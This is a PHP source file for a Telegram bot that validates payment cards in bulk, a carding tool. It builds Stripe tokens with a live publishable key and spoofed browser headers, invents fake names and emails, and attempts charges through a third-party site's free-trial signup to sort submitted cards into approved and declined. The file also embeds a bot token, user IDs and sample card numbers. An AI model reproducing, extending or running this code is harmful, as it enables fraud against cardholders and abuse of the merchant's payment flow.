<?php
error_reporting(0);
date_default_timezone_set('Asia');

$config = [
    'authorized_users' => [8327904812,6887640337],
    'support_group' => -1003932636612,
    'support_username' => '@erenbbzz7',
    'owner' => '@erenbbzz7',
    'bot_token' => "8813802861:AAH50joq2DJ6WXqDlJ7bvNW3hxMWEnmZFzc''
];

function bot($method, $params = []) {
    global $config;
    $url = "https://api.telegram.org/bot{$config['bot_token']}/$method";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function saveUser($userId) {
    $users = file_get_contents('users.txt');
    if(strpos($users, "$userId\n") === false) {
        file_put_contents('users.txt', "$userId\n", FILE_APPEND);
    }
}

function isRegistered($userId) {
    $users = file_get_contents('users.txt');
    return strpos($users, "$userId\n") !== false;
}

function isAuthorized($userId) {
    global $config;
    return in_array($userId, $config['authorized_users']);
}

function extractCC($text) {
    $patterns = [
        '/(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})/',
        '/(\d{16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3})/',
        '/(\d{16})\|(\d{2})\/(\d{2,4})\/(\d{3})/',
        '/(\d{16})\/(\d{2})\/(\d{2})\/(\d{3})/'
    ];

    foreach($patterns as $pattern) {
        if(preg_match($pattern, $text, $matches)) {
            return [
                'cc' => $matches[1],
                'month' => $matches[2],
                'year' => strlen($matches[3]) == 4 ? substr($matches[3], -2) : $matches[3],
                'cvv' => $matches[4]
            ];
        }
    }
    return false;
}

function generateRandomData() {
    // Generate random first and last names
    $firstname = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 8);
    $lastname = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 8);
    
    // Generate random email with common domains
    $domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"];
    $randomDomain = $domains[array_rand($domains)];
    $email = $firstname . rand(100,999) . "@" . $randomDomain;
    
    return [
        'firstname' => ucfirst($firstname),
        'lastname' => ucfirst($lastname),
        'email' => $email,
    ];
}

function checkCC($cc, $month, $year, $cvv) {
    $randomData = generateRandomData();
    
    // First Request - Generate Stripe Token
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: application/json',
        'accept-language: en-US',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://js.stripe.com',
        'referer: https://js.stripe.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);

    $postData = http_build_query([
        'card[number]' => $cc,
        'card[exp_month]' => $month,
        'card[exp_year]' => $year,
        'card[cvc]' => $cvv,
        'card[name]' => $randomData['firstname'] . ' ' . $randomData['lastname'],
        'time_on_page' => rand(30000, 60000),
        'guid' => uniqid(),
        'muid' => uniqid(),
        'sid' => uniqid(),
        'key' => 'pk_live_7brFCCZ0CF9HUzYyJ3a7aMj2',
        'payment_user_agent' => 'stripe.js/78ef418'
    ]);

    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $response1 = curl_exec($ch);
    $token = json_decode($response1, true);
    
    if(!isset($token['id'])) {
        return [
            'success' => false,
            'message' => 'Token generation failed',
            'error' => $token['error']['message'] ?? 'Unknown error'
        ];
    }

    // Second Request - Charge Attempt
    curl_setopt($ch, CURLOPT_URL, 'https://frethub.com/register/FJKfhw');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'content-type: application/x-www-form-urlencoded',
        'origin: https://frethub.com',
        'referer: https://frethub.com/free-trial-join/'
    ]);

    $chargeData = http_build_query([
        'nonce' => md5(uniqid()),
        'stripe_action' => 'charge',
        'charge_type' => 'new',
        'subscription' => '1',
        'first_name' => $randomData['firstname'],
        'last_name' => $randomData['lastname'],
        'email' => $randomData['email'],
        'cc_number' => $cc,
        'cc_expmonth' => $month,
        'cc_expyear' => $year,
        'cc_cvc' => $cvv,
        'stripeToken' => $token['id']
    ]);

    curl_setopt($ch, CURLOPT_POSTFIELDS, $chargeData);
    $response2 = curl_exec($ch);
    curl_close($ch);
    
    if(strpos($response2, 'status=success') !== false) {
        return [
            'success' => true,
            'message' => 'Card charged successfully'
        ];
    } else {
        $error = strpos($response2, 'reason=') ? 
            urldecode(explode('reason=', $response2)[1]) : 
            'Card declined';
            
        return [
            'success' => false,
            'message' => $error
        ];
    }
}

function formatResponse($check, $cc_data) {
    $emojis = $check['success'] ? "✅" : "❌";
    $time = date('h:i:s A');
    
    return "
╔════════════════════╗
║ 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 ║
╚════════════════════╝

▶️ 𝗖𝗖: {$cc_data['cc']}
▶️ 𝗠𝗠/𝗬𝗬: {$cc_data['month']}/{$cc_data['year']}
▶️ 𝗖𝗩𝗩: {$cc_data['cvv']}

𝗦𝘁𝗮𝘁𝘂𝘀: {$emojis} {$check['message']}
𝗧𝗶𝗺𝗲: $time

═══════════════════
𝗕𝗢𝗧 𝗕𝗬: {$GLOBALS['config']['owner']}
";
}

$update = json_decode(file_get_contents('php://input'), true);
$message = $update['message'] ?? null;

if(!$message) die();

$chat_id = $message['chat']['id'];
$user_id = $message['from']['id'];
$text = $message['text'] ?? '';
$chat_type = $message['chat']['type'];

if($text == '/start') {
    $welcome_text = "
╔══════════════════════╗
║   𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗖 𝗕𝗢𝗧   ║
╚══════════════════════╝

▶️ 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿: /register
▶️ 𝗖𝗵𝗲𝗰𝗸 𝗖𝗖: /chk or .chk
▶️ 𝗚𝗿𝗼𝘂𝗽: {$config['support_username']}

𝗕𝗢𝗧 𝗕𝗬: {$config['owner']}
";
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $welcome_text,
        'parse_mode' => 'HTML'
    ]);
}

elseif($text == '/register') {
    saveUser($user_id);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "✅ 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!\n\n𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗶𝗻: {$config['support_username']}",
        'parse_mode' => 'HTML'
    ]);
}

elseif(strpos($text, '/chk') === 0 || strpos($text, '.chk') === 0) {
    if(!isRegistered($user_id)) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗳𝗶𝗿𝘀𝘁 𝘂𝘀𝗶𝗻𝗴 /register",
            'parse_mode' => 'HTML'
        ]);
        die();
    }

    if($chat_type == 'private' && !isAuthorized($user_id)) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❌ 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗶𝗻: {$config['support_username']}",
            'parse_mode' => 'HTML'
        ]);
        die();
    }

    $cc_data = extractCC($text);
    if(!$cc_data) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗖𝗖 𝗳𝗼𝗿𝗺𝗮𝘁!\n\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀:\n5381130100659567|06|25|267\n5218071149227041|03|2026|096",
            'parse_mode' => 'HTML'
        ]);
        die();
    }

    $check = checkCC($cc_data['cc'], $cc_data['month'], $cc_data['year'], $cc_data['cvv']);
    $response = formatResponse($check, $cc_data);
    
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $response,
        'parse_mode' => 'HTML',
        'reply_to_message_id' => $message['message_id']
    ]);
}

if(strpos($text, '/mchk') === 0 || strpos($text, '.mchk') === 0) {
    if(!isRegistered($user_id)) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❌ Please register first using /register",
            'parse_mode' => 'HTML',
            'reply_to_message_id' => $message['message_id']
        ]);
        die();
    }

    // Remove the command from the text
    $text = trim(str_replace(['/mchk', '.mchk'], '', $text));
    
    // Clean up the input and split into lines
    $lines = explode("\n", str_replace(["\r"], "", $text));
    $valid_cards = [];
    
    // Process each line
    foreach($lines as $line) {
        $line = trim($line);
        if(preg_match('/^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})$/', $line, $match)) {
            $valid_cards[] = [
                'cc' => $match[1],
                'month' => $match[2],
                'year' => strlen($match[3]) == 2 ? $match[3] : substr($match[3], -2),
                'cvv' => $match[4]
            ];
        }
    }

    if(empty($valid_cards)) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❌ No valid cards found in input\nFormat: xxxxxxxxxxxxxxxx|mm|yy|cvv",
            'parse_mode' => 'HTML',
            'reply_to_message_id' => $message['message_id']
        ]);
        die();
    }

    // Send initial status message
    $initial_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "⌛ Starting Mass Check...",
        'parse_mode' => 'HTML',
        'reply_to_message_id' => $message['message_id']
    ]);

    $total_cards = count($valid_cards);
    $approved = 0;
    $declined = 0;
    $approved_cards = [];

    // Initial status message
    $status_msg = "═══════════════════════\n";
    $status_msg .= "          𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝟮.𝟬        \n";
    $status_msg .= "═══════════════════════\n";
    $status_msg .= "⌬ 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: $total_cards\n";
    $status_msg .= "⌬ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜: 0/$total_cards\n";
    $status_msg .= "⌬ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: 0\n";
    $status_msg .= "⌬ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: 0\n";
    $status_msg .= "═══════════════════════";

    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $initial_msg['result']['message_id'],
        'text' => $status_msg,
        'parse_mode' => 'HTML'
    ]);

    // Process each card
    foreach($valid_cards as $index => $card) {
        // Check the card
        $check = checkCC($card['cc'], $card['month'], $card['year'], $card['cvv']);
        
        if($check['success']) {
            $approved++;
            $approved_cards[] = "{$card['cc']}|{$card['month']}|{$card['year']}|{$card['cvv']} - ✅";
        } else {
            $declined++;
        }

        // Update status message
        $status_msg = "═══════════════════════\n";
        $status_msg .= "          𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝟮.𝟬        \n";
        $status_msg .= "═══════════════════════\n";
        $status_msg .= "⌬ 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: $total_cards\n";
        $status_msg .= "⌬ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜: " . ($index + 1) . "/$total_cards\n";
        $status_msg .= "⌬ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: $approved\n";
        $status_msg .= "⌬ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: $declined\n";
        $status_msg .= "═══════════════════════";

        if(count($approved_cards) > 0) {
            $status_msg .= "\n\n𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙖𝙧𝙙𝙨 ✅\n";
            foreach($approved_cards as $approved_card) {
                $status_msg .= "$approved_card\n";
            }
        }

        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $initial_msg['result']['message_id'],
            'text' => $status_msg,
            'parse_mode' => 'HTML'
        ]);

        // Add delay between checks to avoid rate limiting
        sleep(3);
    }

    // Final status message
    $final_msg = "═══════════════════════\n";
    $final_msg .= "          𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝟮.𝟬        \n";
    $final_msg .= "═══════════════════════\n";
    $final_msg .= "⌬ 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 ✅\n";
    $final_msg .= "⌬ 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: $total_cards\n";
    $final_msg .= "⌬ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: $approved\n";
    $final_msg .= "⌬ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: $declined\n";
    $final_msg .= "═══════════════════════";

    if(count($approved_cards) > 0) {
        $final_msg .= "\n\n𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙖𝙧𝙙𝙨 ✅\n";
        foreach($approved_cards as $approved_card) {
            $final_msg .= "$approved_card\n";
        }
    }

    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $initial_msg['result']['message_id'],
        'text' => $final_msg,
        'parse_mode' => 'HTML'
    ]);
}